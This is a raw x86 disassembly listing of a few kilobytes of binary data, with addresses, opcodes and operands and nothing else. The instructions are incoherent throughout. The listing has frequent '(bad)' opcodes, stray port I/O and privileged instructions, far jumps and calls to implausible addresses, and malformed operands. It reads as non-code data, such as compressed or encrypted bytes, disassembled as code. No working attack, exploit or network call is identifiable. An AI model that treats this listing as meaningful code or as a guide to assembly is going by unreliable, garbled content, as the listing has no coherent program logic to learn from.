  4166fc:	jae    0x4166a1
  4166fe:	lea    edi,[ecx-0x2e]
  416701:	das    
  416702:	or     eax,0x6b1a49ea
  416707:	xchg   edi,eax
  416708:	mov    ecx,0x212c235e
  41670d:	inc    cl
  41670f:	xor    ebx,DWORD PTR fs:[edi-0x1870cd5d]
  416716:	or     al,BYTE PTR [edi-0x3969f866]
  41671c:	mov    bh,0x44
  41671e:	out    dx,al
  41671f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416720:	sub    ebx,DWORD PTR [edi-0x59]
  416723:	or     al,0x5b
  416725:	out    dx,eax
  416726:	xchg   DWORD PTR [edi-0x1cb05b4a],eax
  41672c:	scas   al,BYTE PTR es:[edi]
  41672d:	cwde   
  41672e:	xchg   ebp,eax
  41672f:	inc    edx
  416730:	mov    bl,0x4d
  416732:	inc    esi
  416733:	loope  0x4166bb
  416735:	add    al,0x40
  416737:	xor    eax,0x1ae5e24e
  41673c:	call   0x5479b26a
  416741:	inc    eax
  416742:	ja     0x4166ea
  416744:	dec    eax
  416745:	jmp    0x416798
  416747:	xchg   edx,eax
  416748:	or     eax,0x7a69ec60
  41674d:	add    ecx,eax
  41674f:	(bad)  
  416750:	rol    DWORD PTR [ebx-0x79],cl
  416753:	ss gs fucom st(4)
  416757:	adc    cl,BYTE PTR [ebp-0x39]
  41675a:	xor    BYTE PTR [esi+0x51f4f97b],ah
  416760:	ror    DWORD PTR [edi],0x4a
  416763:	or     al,0x94
  416765:	xor    DWORD PTR [edi-0x38dd2dcd],edx
  41676b:	and    DWORD PTR [ebp+ebx*1-0x6e52387f],eax
  416772:	fimul  WORD PTR [esi+ebx*1+0x39b31ab4]
  416779:	push   ebx
  41677a:	inc    edx
  41677b:	and    al,BYTE PTR [ecx-0x4e]
  41677e:	sub    ecx,ebp
  416780:	sub    BYTE PTR [ecx-0x2b740d82],bh
  416786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416788:	ds (bad) 
  41678a:	out    0x2e,al
  41678c:	imul   esp,DWORD PTR [edx+0x189f7c68],0x52
  416793:	push   esp
  416794:	fsub   DWORD PTR [edx+0x3adf3fbc]
  41679a:	inc    ebp
  41679b:	icebp  
  41679c:	pop    ebx
  41679d:	ds mov bh,0x8b
  4167a0:	mov    BYTE PTR [edi-0x1f8e94fa],dh
  4167a6:	xchg   ebp,eax
  4167a7:	sub    esi,DWORD PTR [eax+0x4b]
  4167aa:	fwait
  4167ab:	mov    esi,0x686a5560
  4167b0:	test   eax,0xd6b64107
  4167b5:	inc    ecx
  4167b6:	xor    al,ch
  4167b8:	dec    ecx
  4167b9:	repnz lock aad 0x10
  4167bd:	call   0xe8eddadb
  4167c2:	iret   
  4167c3:	sbb    al,0x8c
  4167c5:	push   ebp
  4167c6:	sbb    ah,dl
  4167c8:	mov    eax,ecx
  4167ca:	cs aad 0xc2
  4167cd:	call   FWORD PTR [eax+0x47]
  4167d0:	cmp    esi,DWORD PTR [ecx]
  4167d2:	jmp    0x4167bf
  4167d4:	pop    ecx
  4167d5:	jmp    0xf71f3ca5
  4167da:	add    esi,esp
  4167dc:	stos   BYTE PTR es:[edi],al
  4167dd:	push   ebx
  4167de:	ret    
  4167df:	jns    0x4167c9
  4167e1:	jg     0x41683a
  4167e3:	aad    0x84
  4167e5:	mov    BYTE PTR [esi-0x50b51c14],bh
  4167eb:	pop    esp
  4167ec:	jne    0x41680a
  4167ee:	mov    esi,0xc65ae653
  4167f3:	retf   0xe170
  4167f6:	cmp    eax,0x8a4172a4
  4167fb:	aaa    
  4167fc:	push   edx
  4167fd:	inc    esp
  4167fe:	call   0x2ec5ac03
  416803:	(bad)  
  416804:	jae    0x4167a3
  416806:	scas   al,BYTE PTR es:[edi]
  416807:	mov    al,ds:0x757051a0
  41680c:	aam    0xf6
  41680e:	ret    0x2254
  416811:	neg    DWORD PTR [esi+0x2d1f0581]
  416817:	adc    BYTE PTR [eax+edx*4-0x8616090],al
  41681e:	push   ds
  41681f:	jbe    0x416800
  416821:	and    al,0xcb
  416823:	leave  
  416824:	imul   ebx,DWORD PTR [ebp+0x4f],0x19
  416828:	pop    es
  416829:	stos   BYTE PTR es:[edi],al
  41682a:	idiv   DWORD PTR [ebp-0x17434436]
  416830:	dec    eax
  416831:	mov    edx,0x60b25b22
  416836:	inc    esp
  416837:	imul   edi,DWORD PTR [ebp+0x9529881],0xffffffe3
  41683e:	mov    dl,cl
  416840:	push   cs
  416841:	pop    ss
  416842:	in     eax,0x6b
  416844:	popf   
  416845:	in     al,dx
  416846:	jae    0x416879
  416848:	xchg   edx,eax
  416849:	and    eax,0xac4bfe0e
  41684e:	stc    
  41684f:	jno    0x416831
  416851:	add    bh,BYTE PTR [esi+0x1d538259]
  416857:	into   
  416858:	inc    ebx
  416859:	imul   DWORD PTR [edi-0x1178ae91]
  41685f:	pop    ebp
  416860:	loope  0x4168c0
  416862:	adc    bh,BYTE PTR [edi+0x5b071fba]
  416868:	(bad)  
  416869:	mov    ds:0x7ea06ac3,eax
  41686e:	daa    
  41686f:	lds    ebp,FWORD PTR [ebx-0x64b6a710]
  416875:	add    BYTE PTR [edi+0x5a],0x27
  416879:	push   ss
  41687a:	and    al,0xc2
  41687c:	fld    QWORD PTR [esi-0x17]
  41687f:	jg     0x416832
  416881:	xor    al,0xa5
  416883:	inc    edx
  416884:	add    BYTE PTR [esp+esi*4+0x3c],0xd1
  416889:	out    0xd7,eax
  41688b:	cld    
  41688c:	cmp    bh,ah
  41688e:	sub    BYTE PTR [edi+0x42b51f60],0x11
  416895:	push   cs
  416896:	jmp    0xf280:0x86880265
  41689d:	push   edi
  41689e:	cld    
  41689f:	test   BYTE PTR [edi+0x3218b2ef],al
  4168a5:	imul   ebp,DWORD PTR [eax],0xff87b4d9
  4168ab:	enter  0x24ca,0xf6
  4168af:	inc    eax
  4168b0:	dec    esp
  4168b1:	in     al,dx
  4168b2:	and    edi,edi
  4168b4:	addr16 dec esp
  4168b6:	push   esp
  4168b7:	xor    eax,0xc148e888
  4168bc:	call   0xd72b06b3
  4168c1:	mov    dl,al
  4168c3:	sti    
  4168c4:	out    0x65,al
  4168c6:	mov    ebp,0xc3e4ffa7
  4168cb:	jno    0x416932
  4168cd:	xor    eax,0x79d9629f
  4168d2:	pop    esi
  4168d3:	xchg   ebp,eax
  4168d4:	in     al,0xae
  4168d6:	xor    eax,0x90ed0749
  4168db:	lea    ebx,[edi-0xe]
  4168de:	std    
  4168df:	inc    edx
  4168e0:	pop    es
  4168e1:	mov    bl,0x33
  4168e3:	test   dl,0xe7
  4168e6:	pusha  
  4168e7:	cli    
  4168e8:	mov    cl,0x21
  4168ea:	int    0x72
  4168ec:	fld    TBYTE PTR fs:[ecx+0x41]
  4168f0:	call   0x4ffa110a
  4168f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168f6:	dec    edx
  4168f7:	jecxz  0x416978
  4168f9:	ficomp DWORD PTR [edx+0x1f]
  4168fc:	push   cs
  4168fd:	lahf   
  4168fe:	idiv   DWORD PTR ds:0x4279ba68
  416904:	stos   BYTE PTR es:[edi],al
  416905:	or     eax,0xb5e10064
  41690a:	(bad)  [ecx+0x502d0638]
  416910:	loope  0x4168e6
  416912:	popa   
  416913:	mov    cl,0x6d
  416915:	push   es
  416916:	sbb    eax,0xc2be2651
  41691b:	or     BYTE PTR [ecx+0x37],0xaf
  41691f:	xchg   bh,dh
  416921:	and    BYTE PTR [eax-0x6d],al
  416924:	jg     0x4168e4
  416926:	addr16 out 0x60,eax
  416929:	sbb    al,0xdf
  41692b:	push   es
  41692c:	dec    esp
  41692d:	xor    ebp,DWORD PTR [edi+0x799ae604]
  416933:	mul    BYTE PTR [ecx+ecx*8+0x4ff22fed]
  41693a:	idiv   DWORD PTR [ecx+0x40]
  41693d:	mov    ch,0x53
  41693f:	or     esi,DWORD PTR [esi+0x62]
  416942:	imul   eax,DWORD PTR [esi-0x5535d729],0x20
  416949:	(bad)  
  41694a:	cwde   
  41694b:	push   edx
  41694c:	dec    eax
  41694d:	add    edx,ebp
  41694f:	mov    bh,0x15
  416951:	push   ds
  416952:	xor    BYTE PTR [ecx+0x61afed18],ch
  416958:	sti    
  416959:	and    cl,dh
  41695b:	cmc    
  41695c:	push   0xffffffd2
  41695e:	and    DWORD PTR [ecx-0xdf2d839],ecx
  416964:	mov    DWORD PTR [edi],edi
  416966:	push   esi
  416967:	outs   dx,BYTE PTR ds:[esi]
  416968:	aam    0x69
  41696a:	call   0xa33c8a5f
  41696f:	cmp    DWORD PTR [edx+0x6d],0x95cca010
  416976:	popf   
  416977:	add    esp,DWORD PTR [ebx]
  416979:	daa    
  41697a:	in     al,0x65
  41697c:	mov    al,ds:0x87842e55
  416981:	retf   
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	add    ch,BYTE PTR [edi]
  416995:	dec    edi
  416996:	sub    al,0xa5
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x6870707e
  4169a0:	jle    0x416979
  4169a2:	xchg   bh,cl
  4169a4:	mov    ch,0x5e
  4169a6:	jecxz  0x4169af
  4169a8:	mov    ds:0xe81e0afe,al
  4169ad:	cwd    
  4169af:	rol    BYTE PTR [edx+0x251495e2],0x2b
  4169b6:	call   FWORD PTR [edi]
  4169b8:	mov    BYTE PTR [ebx-0x72],ah
  4169bb:	mov    BYTE PTR [ebx+0x40],ah
  4169be:	mov    ah,0x8c
  4169c0:	push   0x7cb9886d
  4169c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c6:	int    0x4c
  4169c8:	cld    
  4169c9:	jns    0x4169b0
  4169cb:	sub    DWORD PTR [edx],edi
  4169cd:	ret    
  4169ce:	mov    esp,0x551adce
  4169d3:	xrelease xchg BYTE PTR [ebp+0x7b],dl
  4169d7:	sbb    ebp,DWORD PTR [esi-0x237d4ecf]
  4169dd:	mov    dh,0xff
  4169df:	and    BYTE PTR [esi],bl
  4169e1:	int    0xa6
  4169e3:	dec    BYTE PTR [ebp-0x63d29f23]
  4169e9:	and    DWORD PTR [eax],ecx
  4169eb:	dec    ecx
  4169ec:	test   al,0x71
  4169ee:	nop
  4169ef:	retf   
  4169f0:	and    DWORD PTR [ebx],ebp
  4169f2:	imul   DWORD PTR [edx-0x520b0e19]
  4169f8:	fisub  WORD PTR [esi+edx*4-0x10]
  4169fc:	mov    ds:0x7439c914,eax
  416a01:	push   cs
  416a02:	jo     0x416a12
  416a04:	out    0x57,eax
  416a06:	mov    ds:0xb4f3f838,eax
  416a0b:	xchg   esi,edi
  416a0d:	pop    ecx
  416a0e:	xor    cl,BYTE PTR [ecx]
  416a10:	pop    ss
  416a11:	addps  xmm6,XMMWORD PTR [edi+0x42]
  416a15:	nop
  416a16:	ret    0x419f
  416a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a1a:	mov    ch,0x37
  416a1c:	data16 lahf 
  416a1e:	jb     0x416a45
  416a20:	xor    al,0x60
  416a22:	jnp    0x416a4b
  416a24:	cs out dx,eax
  416a26:	cmp    edx,DWORD PTR [edx]
  416a28:	adc    esp,DWORD PTR [eax+0x2c9dfee9]
  416a2e:	andnps xmm5,xmm4
  416a31:	fadd   st,st(3)
  416a33:	dec    ebp
  416a34:	inc    edx
  416a35:	push   ebp
  416a36:	or     eax,0x99bd2ed6
  416a3b:	ds iret 
  416a3d:	test   BYTE PTR [edi],dl
  416a3f:	popf   
  416a40:	mov    dl,0x5f
  416a42:	push   cs
  416a43:	ror    BYTE PTR [edi],0x73
  416a46:	add    BYTE PTR [eax+edi*2+0x14],bl
  416a4a:	xor    DWORD PTR [edx],esi
  416a4c:	mov    bl,0xb5
  416a4e:	outs   dx,BYTE PTR ds:[esi]
  416a4f:	mov    ebx,DWORD PTR [ebx]
  416a51:	push   edx
  416a52:	mov    dh,0x11
  416a54:	retf   
  416a55:	mov    es,WORD PTR [eax-0x3d528b32]
  416a5b:	call   0xa4b:0xb74d13c8
  416a62:	jnp    0xacf0eb44
  416a68:	sbb    DWORD PTR [ebp-0x50],ebx
  416a6b:	lea    ebp,[esi-0x37de7611]
  416a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a72:	and    edx,edx
  416a74:	aaa    
  416a75:	mov    al,0x4c
  416a77:	mov    esi,0xaa3bcf85
  416a7c:	add    BYTE PTR [edi+0x69],cl
  416a7f:	out    0xb5,eax
  416a81:	jo     0x416a68
  416a83:	arpl   WORD PTR [ebp+0x30],sp
  416a86:	jnp    0x416a11
  416a88:	sub    BYTE PTR [edi],cl
  416a8a:	jno    0x416a58
  416a8c:	xchg   esp,eax
  416a8d:	aam    0xf4
  416a8f:	arpl   WORD PTR [ebx-0x7506958c],si
  416a95:	repz jl 0x416a93
  416a98:	cmp    ebx,ebp
  416a9a:	loop   0x416aa3
  416a9c:	imul   ebx,esp,0xffffff8d
  416a9f:	mov    ds:0xe12fbabc,al
  416aa4:	mov    BYTE PTR [edi],ch
  416aa6:	outs   dx,BYTE PTR ds:[esi]
  416aa7:	dec    esp
  416aa8:	jne    0x416acb
  416aaa:	daa    
  416aab:	jmp    0xdc5d:0xacab08b8
  416ab2:	mov    ds:0x8f6c88df,al
  416ab7:	pop    edx
  416ab8:	inc    ebp
  416ab9:	xchg   edi,eax
  416aba:	inc    esi
  416abb:	sar    BYTE PTR [ecx-0x5],1
  416abe:	call   0x46ae:0xa33df240
  416ac5:	or     eax,0xb2da358f
  416aca:	retf   0x134f
  416acd:	fcomp  DWORD PTR [esi+0xe]
  416ad0:	bound  eax,QWORD PTR [eax-0x38]
  416ad3:	adc    DWORD PTR [edi],esi
  416ad5:	cmp    ecx,DWORD PTR [ecx+0x7a9c191a]
  416adb:	imul   ebp,esi,0xffffffc3
  416ade:	retf   0x1d0b
  416ae1:	mov    bh,0x5b
  416ae3:	popa   
  416ae4:	sbb    DWORD PTR [edx+edi*4],eax
  416ae7:	in     eax,dx
  416ae8:	mov    fs,WORD PTR [edi-0x7f]
  416aeb:	push   esp
  416aec:	mov    cl,0xdf
  416aee:	push   esp
  416aef:	loopne 0x416a74
  416af1:	mov    eax,0x56b20887
  416af6:	dec    edx
  416af7:	adc    DWORD PTR [eax-0x62aaf279],eax
  416afd:	shl    BYTE PTR [ebx+0x7a],0x88
  416b01:	(bad)  
  416b02:	mov    cl,0xf3
  416b04:	jl     0x1acd574d
  416b0a:	enter  0x3f87,0xef
  416b0e:	outs   dx,BYTE PTR ds:[esi]
  416b0f:	adc    dl,BYTE PTR [ebx]
  416b11:	out    dx,al
  416b12:	shr    BYTE PTR [ebx],cl
  416b14:	jns    0x416ace
  416b16:	fcomp  DWORD PTR [esi-0x4e109e58]
  416b1c:	mov    BYTE PTR [ecx+0x3a0a379a],al
  416b22:	lods   al,BYTE PTR ds:[esi]
  416b23:	retf   
  416b24:	and    ecx,DWORD PTR [ebx-0x77677ccf]
  416b2a:	xchg   ecx,eax
  416b2b:	enter  0xcd5a,0xb5
  416b2f:	mov    al,ds:0x8d9bac9e
  416b34:	lock enter 0x9004,0xff
  416b39:	xor    al,0xf8
  416b3b:	cmp    eax,0xe1cee202
  416b40:	nop
  416b41:	jge    0x416ba5
  416b43:	xlat   BYTE PTR ds:[ebx]
  416b44:	and    edi,0xffffffc4
  416b47:	inc    edi
  416b48:	fucomi st,st(6)
  416b4a:	(bad)  
  416b4b:	(bad)  
  416b4d:	enter  0xa1df,0x41
  416b51:	cli    
  416b52:	test   eax,0x28139b80
  416b57:	lods   eax,DWORD PTR ds:[esi]
  416b58:	int3   
  416b59:	fistp  WORD PTR [ecx+eiz*4-0x550708c4]
  416b60:	ss sahf 
  416b62:	imul   esp,DWORD PTR [eax+0xab3f738],0xde1d1d6
  416b6c:	pop    esp
  416b6d:	xor    al,0x8b
  416b6f:	(bad)  [eax-0x302b0e24]
  416b75:	(bad)  
  416b76:	xor    esp,DWORD PTR [ecx-0x5665b01]
  416b7c:	lods   eax,DWORD PTR ds:[esi]
  416b7d:	mov    ah,0xb3
  416b7f:	ret    0xad88
  416b82:	dec    ebx
  416b83:	push   ds
  416b84:	sub    DWORD PTR [ebp+0x77],ebx
  416b87:	imul   esi,esp,0x50746fc3
  416b8d:	retf   0x356b
  416b90:	cmc    
  416b91:	rol    BYTE PTR [edi+0x2570d31c],1
  416b97:	push   esi
  416b98:	repz and cl,BYTE PTR [ecx]
  416b9b:	push   edx
  416b9c:	in     eax,dx
  416b9d:	jae    0x416c19
  416b9f:	xchg   ebx,eax
  416ba0:	in     al,0x74
  416ba2:	jmp    0x417be356
  416ba7:	das    
  416ba8:	adc    cl,bl
  416baa:	mov    bh,0x8b
  416bac:	sbb    DWORD PTR [eax-0x39],0xfffffff1
  416bb0:	or     al,BYTE PTR [eax]
  416bb2:	xchg   bl,bh
  416bb4:	add    BYTE PTR [edx+edx*4+0x42],ch
  416bb8:	jae    0x416bb0
  416bba:	test   al,dh
  416bbc:	ror    BYTE PTR [esi-0x50],1
  416bbf:	xor    eax,0x3a1dcccc
  416bc4:	mov    al,0xea
  416bc6:	mov    ax,ds:0x4f769eeb
  416bcc:	xchg   ebx,eax
  416bcd:	test   BYTE PTR [esi+0x4d],al
  416bd0:	shr    DWORD PTR [ebx-0x70b4b8e7],0x73
  416bd7:	mov    ch,0x6b
  416bd9:	cmc    
  416bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bdb:	xor    al,0x94
  416bdd:	jmp    esi
  416bdf:	(bad)  
  416be0:	push   ebp
  416be2:	test   BYTE PTR [ebx-0x44],0xf1
  416be6:	imul   esi,DWORD PTR [ebx],0x546f91e7
  416bec:	or     BYTE PTR [edi+edi*2],al
  416bef:	push   es
  416bf0:	add    edx,DWORD PTR [ebp+0x45]
  416bf3:	mov    ds,WORD PTR [esi+ebp*8]
  416bf6:	mov    esi,0xd854028e
  416bfb:	xor    DWORD PTR [ebp+0x3405a338],edi
  416c01:	xchg   ecx,eax
  416c02:	jge    0x416c67
  416c04:	in     eax,0x49
  416c06:	push   ebp
  416c07:	cdq    
  416c08:	cmp    esi,DWORD PTR [edi-0x2d819ebc]
  416c0e:	pop    ecx
  416c0f:	xchg   ebp,eax
  416c10:	popf   
  416c11:	jno    0x416bae
  416c13:	cmp    BYTE PTR [eax+edx*8+0x3b],al
  416c17:	push   esi
  416c18:	bound  edx,QWORD PTR [edi-0x7b444ad9]
  416c1e:	shl    BYTE PTR [esi+ebp*8+0x7f],1
  416c22:	xor    edi,DWORD PTR [ebx+0x2b]
  416c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c26:	xchg   ah,bl
  416c28:	fst    QWORD PTR [ecx+0x6d2d1990]
  416c2e:	jmp    0x416bb6
  416c30:	mov    ah,0x8d
  416c32:	cld    
  416c33:	mov    ch,0xf3
  416c35:	lock or bl,cl
  416c38:	aas    
  416c39:	cmp    ecx,DWORD PTR [esp+ecx*1]
  416c3c:	enter  0x635f,0x3f
  416c40:	cwde   
  416c41:	out    dx,al
  416c42:	pop    ecx
  416c43:	sbb    bl,BYTE PTR [ecx+0x357b7064]
  416c49:	dec    ecx
  416c4a:	stos   BYTE PTR es:[edi],al
  416c4b:	add    cl,BYTE PTR [ecx]
  416c4d:	stc    
  416c4e:	fmul   DWORD PTR [eax-0x39]
  416c51:	stc    
  416c52:	sub    BYTE PTR [ecx-0xb],ch
  416c55:	add    edi,ebp
  416c57:	test   edi,0x787c9ecd
  416c5d:	cmp    edi,DWORD PTR [ebp-0x1f]
  416c60:	mov    eax,0xbf61bbcc
  416c65:	add    DWORD PTR [ecx-0x75],ecx
  416c68:	inc    ebp
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	mov    ah,0x90
  416c7d:	mov    ebp,0x7f1cee59
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c32
  416c88:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c8a:	pop    ecx
  416c8b:	inc    ebp
  416c8c:	mov    edi,0xf5a8f999
  416c91:	into   
  416c92:	stc    
  416c93:	jo     0x416c65
  416c95:	sub    BYTE PTR [eax+0x3d],bh
  416c98:	pop    esi
  416c99:	std    
  416c9a:	data16 jns 0x416d09
  416c9d:	xor    eax,edx
  416c9f:	push   edx
  416ca0:	push   ss
  416ca1:	cld    
  416ca2:	nop
  416ca3:	jo     0x416c4d
  416ca5:	out    dx,eax
  416ca6:	shl    DWORD PTR [edx+0x4b194087],cl
  416cac:	stos   DWORD PTR es:[edi],eax
  416cad:	outs   dx,DWORD PTR ds:[esi]
  416cae:	xchg   edx,edi
  416cb0:	jle    0x416cd1
  416cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb3:	imul   edx,DWORD PTR [edi-0xc],0xaea1b3a
  416cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cbb:	fistp  QWORD PTR [ebx+0x79]
  416cbe:	lea    edi,[edi-0x26aa0d53]
  416cc4:	mov    DWORD PTR es:[ebp+esi*8+0x7f],0xd03f0322
  416ccd:	mov    edx,0xc0605d0a
  416cd2:	xor    dl,BYTE PTR [edi+0x44d4f390]
  416cd8:	pop    ss
  416cd9:	add    eax,0x76360ce8
  416cde:	jnp    0x416d4a
  416ce0:	push   ebp
  416ce1:	add    edx,DWORD PTR ds:0xf700195f
  416ce7:	mov    cl,BYTE PTR [edi-0x76]
  416cea:	dec    ebp
  416ceb:	out    dx,eax
  416cec:	mov    ebp,0x54fc4dd6
  416cf1:	dec    edi
  416cf2:	or     dl,BYTE PTR [edx]
  416cf4:	mov    ?,WORD PTR [ecx-0x3f626b00]
  416cfa:	jae    0x416d52
  416cfc:	mov    ch,0xac
  416cfe:	call   0x88cda36c
  416d03:	ja     0x416d79
  416d05:	and    eax,esi
  416d07:	les    edi,FWORD PTR [ebx-0x63]
  416d0a:	jno    0x416d69
  416d0c:	inc    ebx
  416d0d:	dec    esi
  416d0e:	loop   0x416cd5
  416d10:	je     0x416d3e
  416d12:	dec    ecx
  416d13:	dec    ebx
  416d14:	(bad)  
  416d15:	or     esi,edx
  416d17:	push   eax
  416d18:	jge    0x416d3f
  416d1a:	sbb    eax,esp
  416d1c:	and    eax,0x6aefddf
  416d21:	lea    ebp,[ecx+0x53f1a6ca]
  416d27:	in     al,dx
  416d28:	pop    ecx
  416d29:	fisttp QWORD PTR [eax+0x1e]
  416d2c:	rcr    DWORD PTR [ebp+0x64],cl
  416d2f:	popa   
  416d30:	fisub  DWORD PTR [edi]
  416d32:	test   al,0xbf
  416d34:	cld    
  416d35:	sub    BYTE PTR [edi-0x6f1d3aa],ch
  416d3b:	mov    edi,0xac149177
  416d40:	jbe    0x416cdc
  416d42:	sbb    eax,0x52f23552
  416d47:	cdq    
  416d48:	pop    eax
  416d49:	lods   al,BYTE PTR ds:[esi]
  416d4a:	add    dl,BYTE PTR [edi-0x137f7a65]
  416d50:	jmp    0xf4c1fb90
  416d55:	pop    esp
  416d56:	das    
  416d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d58:	or     al,0xa
  416d5a:	ficomp DWORD PTR [edx+0x5f]
  416d5d:	out    0x75,al
  416d5f:	int3   
  416d60:	pop    ds
  416d61:	retf   
  416d62:	xor    al,0xc1
  416d64:	test   DWORD PTR [ecx-0x43],0xf3ea4a5e
  416d6b:	std    
  416d6c:	into   
  416d6d:	dec    edi
  416d6f:	add    DWORD PTR [edx+0x63],ecx
  416d72:	sub    BYTE PTR [esi+eax*1-0x45e9de40],bh
  416d79:	or     dh,al
  416d7b:	dec    esi
  416d7c:	rcl    BYTE PTR [edx],cl
  416d7e:	sub    BYTE PTR ds:0x8a79d442,al
  416d84:	jnp    0x416df0
  416d86:	lock imul ebx,DWORD PTR ds:0x2bc5d90d,0xe4229947
  416d91:	imul   DWORD PTR [eax]
  416d93:	or     dl,BYTE PTR [eax]
  416d95:	xchg   esp,eax
  416d96:	in     eax,0xfb
  416d98:	lods   al,BYTE PTR ds:[esi]
  416d99:	ds loope 0x416d7d
  416d9c:	xor    eax,0xcf514f17
  416da1:	xchg   BYTE PTR [eax],al
  416da3:	pop    esi
  416da4:	sti    
  416da5:	jo     0x416db0
  416da7:	(bad)  
  416da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416da9:	dec    ebx
  416daa:	out    0x1,eax
  416dac:	out    0xb4,eax
  416dae:	shl    BYTE PTR [eax-0x5499af93],0xd9
  416db5:	cmp    edi,eax
  416db7:	jmp    0x4c2f7557
  416dbc:	mov    ch,BYTE PTR [edi]
  416dbe:	sbb    BYTE PTR [ecx-0x1d24ca6a],al
  416dc4:	addr16 mov edi,0x7b729065
  416dca:	jnp    0x416dbd
  416dcc:	jmp    0xcffc:0xa97a54fc
  416dd3:	jge    0x416dfc
  416dd5:	imul   ebp,DWORD PTR [ebp+0x7],0x3a
  416dd9:	ins    BYTE PTR es:[edi],dx
  416dda:	fstp   DWORD PTR [esi]
  416ddc:	adc    al,0xcf
  416dde:	inc    esp
  416ddf:	stos   DWORD PTR es:[edi],eax
  416de0:	div    DWORD PTR [eax]
  416de2:	mov    ds:0x122e6c8d,al
  416de7:	outs   dx,BYTE PTR ds:[esi]
  416de8:	fs jnp 0x416dd8
  416deb:	add    eax,DWORD PTR [edi]
  416ded:	push   es
  416dee:	outs   dx,BYTE PTR ds:[esi]
  416def:	jp     0x416d7d
  416df1:	sbb    BYTE PTR [edi+0x19277dd9],0xb9
  416df8:	test   BYTE PTR [eax],0xa
  416dfb:	mov    ebp,0x4aafc29c
  416e00:	mov    WORD PTR gs:[esi-0x4ee89e4d],?
  416e07:	lea    esp,[edi+eax*1]
  416e0a:	addr16 in eax,dx
  416e0c:	ins    BYTE PTR es:[edi],dx
  416e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e0e:	xchg   esi,eax
  416e0f:	inc    edx
  416e10:	aaa    
  416e11:	clc    
  416e12:	push   ds
  416e13:	shl    eax,cl
  416e15:	cmp    al,0xfb
  416e17:	push   0x74
  416e19:	xor    esp,DWORD PTR [edi-0xe]
  416e1c:	pop    edi
  416e1d:	sbb    al,0x16
  416e1f:	pop    ebp
  416e20:	ret    
  416e21:	dec    esi
  416e22:	dec    eax
  416e23:	push   ds
  416e24:	jp     0x416e60
  416e26:	iret   
  416e27:	push   ebp
  416e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e29:	outs   dx,BYTE PTR ds:[esi]
  416e2a:	aas    
  416e2b:	add    al,0xe7
  416e2d:	xchg   DWORD PTR [eax-0x6b98f8f4],ebp
  416e33:	push   ebx
  416e34:	cli    
  416e35:	pop    eax
  416e36:	ja     0x416e24
  416e38:	aad    0x9d
  416e3a:	xchg   DWORD PTR [edi+0x261aa16],edi
  416e40:	jg     0x416e95
  416e42:	or     DWORD PTR [edi+0x2],esp
  416e45:	xchg   edi,eax
  416e46:	or     al,BYTE PTR [ecx+0x49]
  416e49:	mov    edx,0x14836419
  416e4e:	dec    edx
  416e4f:	cmp    ebp,DWORD PTR [ecx-0x2ac4c178]
  416e55:	imul   esi,DWORD PTR [esi],0x415dd0d0
  416e5b:	sbb    edi,DWORD PTR [eax-0x20]
  416e5e:	nop
  416e5f:	idiv   DWORD PTR [ecx-0x3c]
  416e62:	xor    ebx,ebx
  416e64:	push   ecx
  416e65:	test   al,0xd2
  416e67:	int    0x87
  416e69:	push   0xe3ebfcce
  416e6e:	cmp    di,si
  416e71:	sti    
  416e72:	cld    
  416e73:	das    
  416e74:	sub    ch,ah
  416e76:	js     0x416ec3
  416e78:	pop    eax
  416e79:	out    0xc1,eax
  416e7b:	vunpckhps ymm7,ymm2,YMMWORD PTR [ebp-0x7e2cf383]
  416e83:	ja     0x416e85
  416e85:	(bad)  
  416e86:	pop    esi
  416e87:	xchg   ecx,eax
  416e88:	pop    eax
  416e89:	and    al,0x95
  416e8b:	repnz fucom st(5)
  416e8e:	push   ss
  416e8f:	pop    ecx
  416e90:	(bad)  
  416e91:	jns    0x416e8a
  416e93:	pop    ecx
  416e94:	imul   eax,DWORD PTR [edx*8+0x1fc43e68],0xe63f0fb9
  416e9f:	ror    ecx,cl
  416ea1:	mov    eax,ds:0xa73b44d0
  416ea6:	call   0xe72be040
  416eab:	cli    
  416eac:	mov    edx,0xe32e7e4c
  416eb1:	mov    bl,0xe4
  416eb3:	lods   al,BYTE PTR ds:[esi]
  416eb4:	pop    esi
  416eb5:	xchg   ebx,eax
  416eb6:	in     eax,0x6f
  416eb8:	(bad)  
  416eb9:	outs   dx,DWORD PTR ds:[esi]
  416eba:	dec    edx
  416ebb:	sub    bh,BYTE PTR [esi-0x41c23645]
  416ec1:	mov    ah,0x3a
  416ec3:	ins    BYTE PTR es:[edi],dx
  416ec4:	adc    eax,0x63cd59ba
  416ec9:	cmp    DWORD PTR [ebp-0x7d],0xffffffcc
  416ecd:	ret    
  416ece:	push   esp
  416ecf:	bound  ecx,QWORD PTR [ebx]
  416ed1:	push   edx
  416ed2:	mov    bh,0x7e
  416ed4:	mov    dl,0x36
  416ed6:	mov    eax,0x76d42765
  416edb:	shl    DWORD PTR [ebp+0x1bfa45a1],cl
